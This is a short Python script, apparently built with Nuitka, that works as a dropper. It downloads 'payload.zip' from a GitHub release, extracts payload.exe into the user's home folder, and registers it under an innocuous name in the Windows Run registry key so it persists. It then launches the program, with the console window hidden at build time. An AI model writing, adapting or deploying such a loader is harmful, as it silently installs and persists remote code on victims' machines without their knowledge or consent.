# Compilation mode, support OS-specific options
# nuitka-project-if: {OS} in ("Windows", "Linux", "Darwin", "FreeBSD"):
#    nuitka-project: --onefile
# nuitka-project-else:
#    nuitka-project: --mode=standalonealone
# nuitka-project: --windows-console-mode=disable

import urllib.request, os, winreg, zipfile
from pathlib import Path

home = Path.home()

payload_url = 'https://github.com/zznyjidi/force-you-to-play-osu/releases/download/payload-v1/payload.zip'
payload_save_location = str(home) + r'\payload.zip'
payload_extract_location = str(home)
payload_exec_path = payload_extract_location + r'\payload.exe'

urllib.request.urlretrieve(payload_url, 'payload.zip')
os.replace('payload.zip', payload_save_location)

with zipfile.ZipFile(payload_save_location, 'r') as zip:
    zip.extractall(payload_extract_location)

k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(k, 'program', 0, winreg.REG_SZ, payload_exec_path)
winreg.CloseKey(k)

os.system(payload_exec_path)
